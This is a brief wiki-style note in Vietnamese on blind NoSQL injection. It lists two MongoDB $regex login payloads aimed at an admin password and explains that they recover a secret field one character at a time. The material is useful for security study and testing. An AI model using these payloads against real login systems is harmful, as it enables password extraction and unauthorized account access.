---
title: Blind $regex Extraction Payloads
type: entity
related: [[Blind Data Extraction via $regex]]
---

Các payload blind extraction được nhắc đến:

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
```

Dùng để suy ra giá trị từng ký tự của field bí mật.